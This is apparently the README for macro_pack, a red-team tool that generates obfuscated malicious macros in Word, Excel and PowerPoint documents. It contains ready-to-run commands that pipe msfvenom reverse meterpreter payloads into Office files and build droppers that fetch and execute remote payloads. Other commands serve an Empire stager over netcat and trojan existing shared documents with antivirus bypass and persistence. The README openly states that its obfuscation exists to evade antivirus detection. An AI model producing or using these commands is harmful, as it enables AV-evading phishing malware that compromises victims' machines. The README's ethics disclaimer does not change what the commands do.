# macro\_pack

## Short description

The macro\_pack is a tool used to automatize obfuscation and generation of MS Office documents for pentest, demo,  and social engineering assessments.
The goal of macro\_pack is to simplify antimalware solutions bypass and automatize the process from vba generation to final Office document generation.
It is very simple to use:
* No configuration
* Everything can be done using a single line of code
* Generation of Word, Excel, and PowerPoint documents

The tool is compatible with payloads generated by popular pentest tools (Metasploit, Empire, ...).
It is also easy to combine with other tools as it is possible to read input from stdin and have a quiet output to another tool.
This tool is written in Python3 and works on both Linux and Windows platform.

**Note:** Windows platform with genuine MS Office installed is required for Office documents automatic generation or trojan features.

### Obfuscation

The tool will use various obfuscation techniques, all automatic.
Basic obfuscation (-o option) includes:
* Renaming functions
* Renaming variables
* Removing spaces
* Removing comments
* Encoding Strings

Note that the main goal of macro\_pack obfuscation is not to prevent reverse engineering, it is to prevent antivirus detection.


### Ethical use

The macro\_pack tool shall only be used by pentester, security researchers, or other people with learning purpose. 
I condamn all use of security tools for unethical actions (weather these ar legal or illegal).
I know this will not prevent usage by malicious people and that is why all features are not publicly released.

### About pro mode...
You may notice that not all part of macro\_pack is available. Only the community version is available online.
I fear the features in the pro version are really too much "weaponizing" the process and I do not want it available to all script kiddies out there.
The pro mode includes features such as:
* Advance antimalware bypass
* VBOM security bypass
* Self decoding VBA
* MS Office persistance
* Trojan existing MS Office documents
* Anti-debug using http://seclists.org/fulldisclosure/2017/Mar/90

I do not know yet what I intend to do with pro mode, release it, keep it for myself, sell it? 


## Run/Install

### Run Windows binary
1) Get the latest binary from https://github.com/sevagas/macro_pack/releases/
2) Download binary on PC with genuine Microsoft Office installed.
3) Open console, CD to binary dir and call the binary, simple as that!
```bash
macro_pack.exe --help
```

### Install from sources
Download and install dependencies:
```bash
git clone https://github.com/sevagas/macro_pack.git
cd macro_pack
pip3 install -r requirements.txt
```

**Note:** For windows, you also need to download manually pywin32 from https://sourceforge.net/projects/pywin32/files/pywin32/

The tool is in python 3 so just start with with your python3 install. ex:
```bash
python3 macro_pack.py  --help
# or
python macro_pack.py --help # if python3 is default install
```
If you want to produce a standalone exe using pyinstaller, double-click on the "build.bat" script on a Windows machine.
The resulted macro\_pack.exe will be inside the **bin** directory.


## Some examples

### macro\_pack community

- Obfuscate the vba file generated by msfvenom and put result in a new vba file.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o -v meterobf.vba
```

- Obfuscate Empire stager vba file and generate a MS Word document: 
```bash
macro_pack.exe -f empire.vba -o -W myDoc.docm
```

- Generate an MS Excel file containing an obfuscated dropper (download payload.exe and store as dropped.exe)
```bash
echo "https://myurl.url/payload.exe" "dropped.exe" |  macro_pack.exe -o -t DROPPER -x "drop.xlsm" 
```

- Create a word 97 document containing an obfuscated VBA reverse meterpreter payload inside a share folder: 
```bash
msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o -w \\REMOTE-PC\Share\meter.doc   
```

- Download and execute Empire Launcher stager without powershell.exe by using DROPPER_PS template
```bash
# 1 Generate a fiez containing Empire lauchcher 
# 2 Make that file available on web server, ex with netcat:
{ echo -ne "HTTP/1.0 200 OK\r\n\r\n"; cat empire_stager.cmd; } | nc -l -p 6666 -q1
# 3 Use macro\_pack  to generate DROPPER_PS payload in Excel file
echo http://10.5.5.12:6543/empire_stager.cmd | macro_pack.exe -o -t DROPPER_PS -x join_the_empire.xls
# 4 When executed on target, the macro will download PowerShdll, run it with rundll32, and download and execute stager.
```

### macro\_pack pro

- Trojan the existing shared "report.xlsm" file with a dropper. Use anti-AV and anti-debug features.
```bash
echo "http://10.5.5.12/drop.exe" "dropped.exe" | macro_pack.exe -o -t DROPPER2 --trojan --av-bypass --stealth  -X "E:\accounting\report.xlsm"   
```

- Genenerate a Word file containing VBA self encoded x64 reverse meterpreter VBA payload (will bypass most AV). Keep-alive is needed because we need meterpreter to stay alive before we migrate.
```bash
msfvenom.bat -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --vbom-encode --keep-alive  -W  out.docm
```

- Trojan a PowerPoint file with a reverse meterpreter. Macro is obfuscated and mangled to bypass most antiviruses. 
```bash
msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --av-bypass --trojan -P  hotpics.pptm
```


## All available options

### General options:
```
    -f, --input-file=INPUT_FILE_PATH A VBA macro file or file containing params for --template option. 
          If no input file is provided, input must be passed via stdin (using a pipe).
    -q, --quiet     Do not display anything on screen, just process request. 
    -o, --obfuscate Obfuscate macro Destroy document readability by changing form,names, and strings
                    Same as '--obfuscate-form --obfuscate-names --obfuscate-strings'
    --obfuscate-form  Modify readability by removing all spaces and comments in VBA
    --obfuscate-strings  Randomly split strings and encode them
    --obfuscate-names Change functions, variables, and constants names  
    -s, --start-function=START_FUNCTION   Entry point of macro file 
        Note that macro_pack will automatically detect AutoOpen, Workbook_Open, or Document_Open  as the start function
    -t, --template=TEMPLATE_NAME 
        Available templates:
            DROPPER -> Download and exec file
                    -> Example use:  echo <file_to_drop_url> "<download_path>" | macro_pack.exe -t DROPPER -o -x dropper.xls
            DROPPER2 -> Download and exec file. File attributes are also set to system, readonly, and hidden
                    -> Example use:  echo <file_to_drop_url> "<download_path>" | macro_pack.exe -t DROPPER2 -o -X dropper.xlsm
            DROPPER_PS -> Download and execute Powershell script using rundll32 (to bypass blocked powershell.exe)
                    -> Example use:  echo "<powershell_script_url>" | macro_pack.exe -t DROPPER_PS -o -w powpow.doc
                    Note: This payload will download PowerShdll dll from Github.
    -v, --vba-output=VBA_FILE_PATH Output generated vba macro (text format) to given path.
    -h, --help   Displays help and exit
  Notes:
    If no output file is provided, the result will be displayed on stdout.
    Combine this with -q option to pipe only processed result into another program
    ex: macro_pack.exe -f my_vba.vba -o -q | another_app
    Another valid usage is:
    cat input_file.vba | macro_pack.exe -o -q  > output_file.vba
```

### macro\_pack Pro only:
```   
    --vbom-encode   Use VBA self encoding to bypass antimalware detection and enable VBOM access (will exploit VBOM self activation vuln).
                  --start-function option may be needed.
    --av-bypass  Use various tricks  efficient to bypass most av (combine with -o for best result)
    --keep-alive    Use with --vbom-encode option. Ensure new app instance will stay alive even when macro has finished
    --persist       Use with --vbom-encode option. Macro will automatically be persisted in application startup path
                    (works with Excel documents only). The macro will then be executed anytime an Excel document is opened (even non-macro documents).
    --trojan       Inject macro in an existing MS office file. Use in conjunction with -x, -X, -w, or -W
    --stealth      Anti-debug and hiding features
```

### Windows only
MS Office document generation requires to be running on Windows machine with genuine MS Office installed.

```
    -X, --excel-output=EXCEL_FILE_PATH   Generates MS Excel (*.xlsm) file containing the macro.
    -x, --excel97-output=EXCEL_FILE_PATH Generates MS Excel 97-2003 (*.xls) file containing the macro.
    -W, --word-output=WORD_FILE_PATH     Generates MS Word (.docm) file containing the macro.
    -w, --word97-output=WORD_FILE_PATH   Generates MS Word 97-2003 (.doc) file containing the macro.
    -P --ppt-output=PPT_FILE_PATH        Generates MS PowerPoint (.pptm) file.

```


## Efficiency

The various features were tested against localy installed Antimalware solutions as well as online service. I ran multiple tests with several kind of payloads and macro\_pack features.
A majority of antivirus will be evaded by the simple "obfuscate" option. Features available in pro mode generally ensure full AV bypass.

### Example with Empire VBA stager:

Here are the results of NoDistribute scanner for the regular Empire VBA stager
<p align="center"><img src="./assets/empireVbaAgent.png" alt="Empire VBA stager scan"></p>

Here are the results with the macro\_pack -o (--obfuscate) option
<p align="center"><img src="./assets/empireVBA_mp_obfuscate.png" alt="Empire VBA stager scan"></p>

**Warning:** Do not submit your samples to online scanner (ex VirusTotal), Its the best way to break your stealth macro.
I also suggest you do not submit to non reporting site such as NoDistribute. You cannot be sure what these sites will do with the data you submit. 
If you have an issue with macro\_pack AV detection you can write to us for advice or submit an issue or pull request.
